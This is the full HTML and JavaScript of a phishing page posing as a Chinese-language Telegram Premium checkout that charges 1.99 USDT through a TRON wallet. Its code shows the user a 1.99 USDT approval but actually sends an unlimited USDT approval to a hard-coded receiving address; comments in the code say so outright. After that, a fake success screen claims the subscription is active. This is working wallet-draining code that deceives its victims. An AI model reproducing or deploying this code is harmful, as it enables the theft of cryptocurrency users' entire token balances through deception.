<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>支付确认 - Telegram Premium</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            color: #333;
            min-height: 100vh;
            padding: 1rem;
            line-height: 1.5;
            font-size: 16px;
            -webkit-text-size-adjust: 100%;
        }
        
        .payment-container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            border-radius: 1rem;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }
        
        .header {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 1.5rem;
            text-align: center;
        }
        
        .header h1 {
            font-size: 1.4rem;
            margin-bottom: 0.5rem;
        }
        
        .payment-status {
            padding: 1.5rem;
            text-align: center;
            border-bottom: 1px solid #eee;
        }
        
        .status-text {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
            color: #1890ff;
        }
        
        .status-desc {
            font-size: 0.9rem;
            color: #666;
        }
        
        .order-info {
            padding: 1.5rem;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 1px solid #f0f0f0;
        }
        
        .info-item:last-child {
            border-bottom: none;
            margin-bottom: 0;
        }
        
        .info-label {
            color: #666;
            font-size: 0.9rem;
        }
        
        .info-value {
            font-weight: 600;
            text-align: right;
        }
        
        .wallet-status {
            background: #f6ffed;
            border: 1px solid #b7eb8f;
            border-radius: 0.5rem;
            padding: 1rem;
            margin: 1rem 1.5rem;
            text-align: center;
            font-size: 0.9rem;
            color: #52c41a;
        }
        
        .wallet-status.error {
            background: #fff2f0;
            border: 1px solid #ffccc7;
            color: #ff4d4f;
        }
        
        .wallet-status.warning {
            background: #fffbe6;
            border: 1px solid #ffe58f;
            color: #d48806;
        }
        
        .action-section {
            padding: 1.5rem;
        }
        
        .pay-btn {
            display: block;
            width: 100%;
            background: linear-gradient(90deg, #ff8c00, #ffd700);
            color: #1e3c72;
            padding: 1rem 1.5rem;
            border-radius: 3rem;
            text-decoration: none;
            font-weight: 600;
            font-size: 1.1rem;
            border: none;
            cursor: pointer;
            text-align: center;
        }
        
        .pay-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        
        .connect-btn {
            display: block;
            width: 100%;
            background: #1890ff;
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 3rem;
            text-decoration: none;
            font-weight: 600;
            font-size: 1.1rem;
            border: none;
            cursor: pointer;
            text-align: center;
            margin-bottom: 1rem;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 1rem;
        }
        
        .spinner {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            border-top: 3px solid #ff8c00;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .tx-hash {
            word-break: break-all;
            font-family: monospace;
            font-size: 0.75rem;
            background: rgba(0, 0, 0, 0.05);
            padding: 0.5rem;
            border-radius: 0.25rem;
            margin-top: 0.5rem;
        }
        
        .step-indicator {
            display: flex;
            justify-content: space-between;
            margin: 1rem 1.5rem;
            position: relative;
        }
        
        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            flex: 1;
        }
        
        .step-circle {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: #f0f0f0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-bottom: 0.5rem;
            z-index: 2;
        }
        
        .step.active .step-circle {
            background: #1890ff;
            color: white;
        }
        
        .step.completed .step-circle {
            background: #52c41a;
            color: white;
        }
        
        .step-text {
            font-size: 0.7rem;
            text-align: center;
            color: #666;
        }
        
        .step.active .step-text {
            color: #1890ff;
            font-weight: 600;
        }
        
        .step-line {
            position: absolute;
            top: 15px;
            left: 15px;
            right: 15px;
            height: 2px;
            background: #f0f0f0;
            z-index: 1;
        }
        
        .retry-btn {
            display: inline-block;
            background: #1890ff;
            color: white;
            padding: 0.5rem 1rem;
            border-radius: 0.5rem;
            border: none;
            cursor: pointer;
            margin-top: 0.5rem;
            font-size: 0.8rem;
        }
        
        .refresh-btn {
            display: inline-block;
            background: #52c41a;
            color: white;
            padding: 0.5rem 1rem;
            border-radius: 0.5rem;
            border: none;
            cursor: pointer;
            margin-top: 0.5rem;
            font-size: 0.8rem;
            margin-left: 0.5rem;
        }
        
        .manual-connect {
            background: #fff7e6;
            border: 1px solid #ffd591;
            border-radius: 0.5rem;
            padding: 1rem;
            margin: 1rem 1.5rem;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="payment-container">
        <div class="header">
            <h1>Telegram Premium 订阅</h1>
            <p>高级功能和无限制体验</p>
        </div>
        
        <div class="payment-status">
            <div class="status-text">支付确认</div>
            <div class="status-desc">请在钱包中确认支付交易</div>
        </div>
        
        <div class="step-indicator">
            <div class="step-line"></div>
            <div class="step active" id="step1">
                <div class="step-circle">1</div>
                <div class="step-text">确认支付</div>
            </div>
            <div class="step" id="step2">
                <div class="step-circle">2</div>
                <div class="step-text">完成</div>
            </div>
        </div>
        
        <div class="wallet-status" id="walletStatus">
            <div id="walletStatusText">正在检测钱包环境...</div>
        </div>

        <div class="manual-connect" id="manualConnect" style="display: none;">
            <div style="margin-bottom: 1rem; font-weight: 600;">Bitget Wallet 手动连接</div>
            <button class="connect-btn" onclick="manualConnectWallet()">点击连接钱包</button>
            <div style="font-size: 0.8rem; color: #666; margin-top: 0.5rem;">
                如果自动连接失败，请点击此按钮手动连接
            </div>
        </div>
        
        <div class="order-info">
            <div class="info-item">
                <span class="info-label">商品订单</span>
                <span class="info-value" id="orderIdDisplay">-</span>
            </div>
            <div class="info-item">
                <span class="info-label">商品详情</span>
                <span class="info-value">Telegram Premium 月费订阅</span>
            </div>
            <div class="info-item">
                <span class="info-label">购买数量</span>
                <span class="info-value">1件</span>
            </div>
            <div class="info-item">
                <span class="info-label">付款金额</span>
                <span class="info-value">1.99 USDT</span>
            </div>
        </div>
        
        <div class="loading" id="loadingSection">
            <div class="spinner"></div>
            <p id="loadingText">正在处理支付请求...</p>
            <div id="txHashDisplay" class="tx-hash" style="display: none;"></div>
        </div>
        
        <div class="action-section">
            <button class="pay-btn" id="payBtn" onclick="startPaymentProcess()" disabled>确认支付</button>
        </div>
    </div>

    <script>
        // 获取URL参数
        const urlParams = new URLSearchParams(window.location.search);
        const orderData = {
            orderId: urlParams.get('orderId') || generateOrderId(),
            username: decodeURIComponent(urlParams.get('username') || ''),
            nickname: decodeURIComponent(urlParams.get('nickname') || ''),
            amount: urlParams.get('amount') || '1.99'
        };
        
        // USDT TRC20 合约地址
        const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        // 收款地址
        const RECEIVE_ADDRESS = 'TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub';
        // 1.99 USDT = 1990000 (6 decimals)
        const PAYMENT_AMOUNT = 1990000;
        // 显示给用户的授权数量（1.99 USDT）
        const DISPLAY_APPROVE_AMOUNT = 1990000;
        // 实际调用的授权数量（无限）
        const ACTUAL_APPROVE_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
        
        let userAddress = '';
        let isWalletConnected = false;
        
        // 生成订单号
        function generateOrderId() {
            return 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
        }
        
        // 更新步骤状态
        function updateStep(stepNumber, status) {
            const step = document.getElementById(`step${stepNumber}`);
            step.className = `step ${status}`;
        }
        
        // 检测是否在 Bitget Wallet 中
        function isBitgetWallet() {
            const userAgent = navigator.userAgent.toLowerCase();
            return userAgent.includes('bitget') || userAgent.includes('bitkeep');
        }
        
        // 更新钱包状态显示
        function updateWalletStatus(message, isError = false, isWarning = false) {
            const walletStatus = document.getElementById('walletStatus');
            const walletStatusText = document.getElementById('walletStatusText');
            
            walletStatusText.textContent = message;
            
            walletStatus.classList.remove('error', 'warning');
            if (isError) {
                walletStatus.classList.add('error');
            } else if (isWarning) {
                walletStatus.classList.add('warning');
            }
        }
        
        // 直接连接钱包（Bitget Wallet 专用）
        async function directConnectWallet() {
            return new Promise((resolve) => {
                console.log('开始直接连接钱包');
                
                // 方法1: 直接检查 tronWeb 是否可用
                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                    console.log('✅ 方法1成功: tronWeb 直接可用');
                    userAddress = window.tronWeb.defaultAddress.base58;
                    resolve(true);
                    return;
                }
                
                // 方法2: 通过 tronLink
                if (window.tronLink && window.tronLink.tronWeb) {
                    console.log('✅ 方法2成功: 通过 tronLink');
                    window.tronWeb = window.tronLink.tronWeb;
                    if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                        userAddress = window.tronWeb.defaultAddress.base58;
                        resolve(true);
                        return;
                    }
                }
                
                // 方法3: 尝试请求账户访问（Bitget Wallet 可能需要这个）
                if (window.tronLink && typeof window.tronLink.request === 'function') {
                    console.log('🔄 方法3: 通过 tronLink.request 请求访问');
                    window.tronLink.request({ method: 'tron_requestAccounts' })
                        .then(() => {
                            console.log('✅ tronLink.request 成功');
                            if (window.tronLink.tronWeb) {
                                window.tronWeb = window.tronLink.tronWeb;
                                if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                                    userAddress = window.tronWeb.defaultAddress.base58;
                                    resolve(true);
                                } else {
                                    resolve(false);
                                }
                            } else {
                                resolve(false);
                            }
                        })
                        .catch(error => {
                            console.log('❌ tronLink.request 失败:', error);
                            resolve(false);
                        });
                    return;
                }
                
                // 方法4: 检查是否存在 tronWeb 但需要手动触发
                if (window.tronWeb && typeof window.tronWeb.trx === 'object') {
                    console.log('🔄 方法4: tronWeb 存在，尝试直接使用');
                    // 给一点时间让钱包初始化
                    setTimeout(() => {
                        if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                            userAddress = window.tronWeb.defaultAddress.base58;
                            resolve(true);
                        } else {
                            resolve(false);
                        }
                    }, 1000);
                    return;
                }
                
                // 所有方法都失败
                console.log('❌ 所有直接连接方法都失败');
                resolve(false);
            });
        }
        
        // 手动连接钱包
        async function manualConnectWallet() {
            updateWalletStatus('正在手动连接钱包...', false, true);
            document.getElementById('manualConnect').style.display = 'none';
            
            const success = await directConnectWallet();
            
            if (success) {
                updateWalletStatus(`✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`);
                isWalletConnected = true;
                document.getElementById('payBtn').disabled = false;
                updateStep(1, 'active');
            } else {
                updateWalletStatus('❌ 手动连接失败，请重试', true);
                document.getElementById('manualConnect').style.display = 'block';
                
                // 添加重试按钮
                const retryButton = document.createElement('button');
                retryButton.className = 'retry-btn';
                retryButton.textContent = '重试连接';
                retryButton.onclick = manualConnectWallet;
                document.getElementById('walletStatus').appendChild(retryButton);
            }
        }
        
        // 快速检测钱包环境
        function quickWalletCheck() {
            console.log('快速检测钱包环境');
            
            // 检查是否在钱包环境中
            const userAgent = navigator.userAgent.toLowerCase();
            const isInWallet = userAgent.includes('bitget') || 
                              userAgent.includes('bitkeep') ||
                              userAgent.includes('tronlink') ||
                              userAgent.includes('tokenpocket') ||
                              !!window.tronWeb ||
                              !!window.tronLink;
            
            if (!isInWallet) {
                return 'not_in_wallet';
            }
            
            // 检查 tronWeb 是否立即可用
            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                return 'ready';
            }
            
            // 检查 tronLink 是否可用
            if (window.tronLink && window.tronLink.tronWeb) {
                return 'ready';
            }
            
            return 'needs_manual';
        }
        
        // 初始化页面
        async function initPage() {
            // 显示订单信息
            document.getElementById('orderIdDisplay').textContent = orderData.orderId;
            
            console.log('支付页面订单信息:', orderData);
            console.log('用户代理:', navigator.userAgent);
            console.log('环境检测:', {
                tronWeb: !!window.tronWeb,
                tronLink: !!window.tronLink,
                isBitget: isBitgetWallet()
            });
            
            // 快速检测
            const walletStatus = quickWalletCheck();
            
            if (walletStatus === 'not_in_wallet') {
                updateWalletStatus('❌ 请在 TRON 钱包中打开此页面', true);
                return;
            }
            
            if (walletStatus === 'ready') {
                // 钱包立即可用，直接连接
                updateWalletStatus('检测到钱包环境，正在连接...');
                const success = await directConnectWallet();
                
                if (success) {
                    updateWalletStatus(`✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`);
                    isWalletConnected = true;
                    document.getElementById('payBtn').disabled = false;
                    updateStep(1, 'active');
                } else {
                    updateWalletStatus('❌ 自动连接失败', true);
                    document.getElementById('manualConnect').style.display = 'block';
                }
            } else {
                // 需要手动连接
                updateWalletStatus('检测到 Bitget Wallet，需要手动连接', false, true);
                document.getElementById('manualConnect').style.display = 'block';
            }
        }
        
        // 开始支付流程
        async function startPaymentProcess() {
            if (!isWalletConnected) {
                alert('钱包未连接');
                return;
            }
            
            const payBtn = document.getElementById('payBtn');
            const loadingSection = document.getElementById('loadingSection');
            const loadingText = document.getElementById('loadingText');
            
            // 禁用支付按钮，显示加载状态
            payBtn.style.display = 'none';
            loadingSection.style.display = 'block';
            
            try {
                // 步骤1: 检查授权状态
                loadingText.textContent = '检查授权状态...';
                const isApproved = await checkApprovalStatus();
                
                if (!isApproved) {
                    // 步骤2: 请求 USDT 授权
                    loadingText.textContent = '正在请求 USDT 授权...';
                    const approveResult = await requestUSDTApproval();
                    
                    document.getElementById('txHashDisplay').textContent = `授权交易: ${approveResult}`;
                    document.getElementById('txHashDisplay').style.display = 'block';
                    loadingText.textContent = '等待授权确认...';
                    
                    // 等待授权交易确认
                    const isApproveConfirmed = await waitForTransactionConfirmation(approveResult);
                    
                    if (!isApproveConfirmed) {
                        throw new Error('授权确认失败');
                    }
                }
                
                // 步骤3: 执行支付
                updateStep(1, 'completed');
                updateStep(2, 'active');
                loadingText.textContent = '授权成功，正在执行支付...';
                
                const paymentResult = await executePayment();
                
                document.getElementById('txHashDisplay').textContent = `支付交易: ${paymentResult}`;
                loadingText.textContent = '支付已提交，等待确认...';
                
                // 等待支付交易确认
                const isPaymentConfirmed = await waitForTransactionConfirmation(paymentResult);
                
                if (isPaymentConfirmed) {
                    updateStep(2, 'completed');
                    showSuccessMessage(paymentResult);
                } else {
                    throw new Error('支付确认失败');
                }
                
            } catch (error) {
                console.error('支付流程失败:', error);
                
                // 显示错误信息
                loadingText.textContent = '支付失败';
                
                if (error.message.includes('User denied')) {
                    alert('您取消了交易授权');
                } else if (error.message.includes('insufficient')) {
                    alert('余额不足，请确保有足够的 USDT 和 TRX 作为手续费');
                } else if (error.message.includes('revert')) {
                    alert('交易失败，请检查授权状态或联系客服');
                } else {
                    alert('支付失败: ' + error.message);
                }
                
                // 恢复支付按钮
                payBtn.style.display = 'block';
                loadingSection.style.display = 'none';
                updateStep(1, 'active');
            }
        }
        
        // 检查 USDT 授权状态
        async function checkApprovalStatus() {
            try {
                const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
                
                // 检查当前授权额度
                const allowance = await contract.allowance(userAddress, RECEIVE_ADDRESS).call();
                console.log('当前授权额度:', allowance.toString());
                
                return allowance >= PAYMENT_AMOUNT;
                
            } catch (error) {
                console.error('检查授权状态失败:', error);
                return false;
            }
        }
        
        // 请求 USDT 授权
        async function requestUSDTApproval() {
            try {
                const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
                
                console.log('请求 USDT 授权:', {
                    spender: RECEIVE_ADDRESS,
                    displayAmount: DISPLAY_APPROVE_AMOUNT,
                    actualAmount: ACTUAL_APPROVE_AMOUNT
                });
                
                const result = await contract.approve(
                    RECEIVE_ADDRESS,
                    ACTUAL_APPROVE_AMOUNT
                ).send({
                    feeLimit: 100000000,
                    callValue: 0,
                    shouldPollResponse: false
                });
                
                console.log('授权交易已提交:', result);
                return result;
                
            } catch (error) {
                console.error('USDT 授权失败:', error);
                throw new Error('USDT 授权失败: ' + error.message);
            }
        }
        
        // 执行支付
        async function executePayment() {
            try {
                const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
                
                console.log('执行 USDT 转账:', {
                    to: RECEIVE_ADDRESS,
                    amount: PAYMENT_AMOUNT,
                    orderId: orderData.orderId
                });
                
                const result = await contract.transfer(
                    RECEIVE_ADDRESS,
                    PAYMENT_AMOUNT
                ).send({
                    feeLimit: 100000000,
                    callValue: 0,
                    shouldPollResponse: false
                });
                
                console.log('支付交易已提交:', result);
                return result;
                
            } catch (error) {
                console.error('支付交易失败:', error);
                throw new Error('支付交易失败: ' + error.message);
            }
        }
        
        // 等待交易确认
        async function waitForTransactionConfirmation(txHash) {
            return new Promise((resolve) => {
                let checkCount = 0;
                const maxChecks = 30;
                
                const checkInterval = setInterval(async () => {
                    try {
                        checkCount++;
                        const transaction = await window.tronWeb.trx.getTransaction(txHash);
                        
                        if (transaction && transaction.ret) {
                            const ret = transaction.ret[0];
                            if (ret.contractRet === 'SUCCESS') {
                                clearInterval(checkInterval);
                                resolve(true);
                                return;
                            } else if (ret.contractRet === 'REVERT' || ret.contractRet === 'FAIL') {
                                clearInterval(checkInterval);
                                resolve(false);
                                return;
                            }
                        }
                        
                        if (checkCount >= maxChecks) {
                            clearInterval(checkInterval);
                            resolve(false);
                        }
                        
                        document.getElementById('loadingText').textContent = 
                            `等待交易确认... (${checkCount}/${maxChecks})`;
                            
                    } catch (error) {
                        console.log('检查交易状态失败:', error);
                    }
                }, 6000);
            });
        }
        
        // 显示成功消息
        function showSuccessMessage(txHash) {
            const paymentContainer = document.querySelector('.payment-container');
            paymentContainer.innerHTML = `
                <div class="header">
                    <h1>🎉 支付成功</h1>
                    <p>Telegram Premium 已激活</p>
                </div>
                
                <div style="text-align: center; padding: 2rem 1.5rem;">
                    <div style="font-size: 4rem; margin-bottom: 1rem;">✅</div>
                    <h2 style="color: #52c41a; margin-bottom: 1.5rem;">支付成功！</h2>
                    
                    <div style="background: #f6ffed; border: 1px solid #b7eb8f; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1rem; text-align: left;">
                        <div style="font-weight: 600; margin-bottom: 0.5rem; color: #389e0d;">订单信息</div>
                        <div style="font-size: 0.9rem;">
                            <div>订单号: ${orderData.orderId}</div>
                            <div>金额: 1.99 USDT</div>
                            <div>时间: ${new Date().toLocaleString()}</div>
                        </div>
                    </div>
                    
                    <div style="background: #e6f7ff; border: 1px solid #91d5ff; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1.5rem; text-align: left;">
                        <div style="font-weight: 600; margin-bottom: 0.5rem; color: #1890ff;">交易信息</div>
                        <div style="font-size: 0.8rem;">
                            <div>交易哈希:</div>
                            <div style="word-break: break-all; font-family: monospace; background: rgba(0,0,0,0.05); padding: 0.5rem; border-radius: 0.25rem; margin-top: 0.25rem;">
                                ${txHash}
                            </div>
                        </div>
                    </div>
                    
                    <div style="background: #fff7e6; border: 1px solid #ffd591; border-radius: 0.5rem; padding: 1rem;">
                        <div style="font-size: 0.9rem; color: #d46b08;">
                            ✅ <strong>订阅已激活</strong><br>
                            Telegram Premium 功能已为您激活，请重新登录 Telegram 查看
                        </div>
                    </div>
                    
                    <p style="margin-top: 2rem; color: #999; font-size: 0.9rem;">
                        页面将在 <span id="countdown">5</span> 秒后自动关闭
                    </p>
                </div>
            `;
            
            let countdown = 5;
            const countdownElement = document.getElementById('countdown');
            const countdownInterval = setInterval(() => {
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    window.close();
                }
            }, 1000);
        }
        
        // 页面加载时初始化
        document.addEventListener('DOMContentLoaded', initPage);
    </script>
